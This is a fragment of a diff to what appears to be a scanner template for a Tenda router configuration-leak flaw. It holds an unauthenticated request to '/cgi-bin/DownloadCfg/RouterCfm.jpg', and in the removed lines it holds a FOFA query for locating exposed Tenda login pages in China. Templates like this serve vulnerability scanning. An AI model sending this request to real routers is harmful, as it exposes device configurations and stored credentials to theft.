@@ -3,12 +3,8 @@ info:
   name: Tenda RouterCfm.jpg 配置信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gv8whg558l0foigz'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gv8whg558l0foigz
-    fofa: title="Tenda | LOGIN" && country="CN"
 http:
 - raw:
   - 'GET /cgi-bin/DownloadCfg/RouterCfm.jpg HTTP/1.1
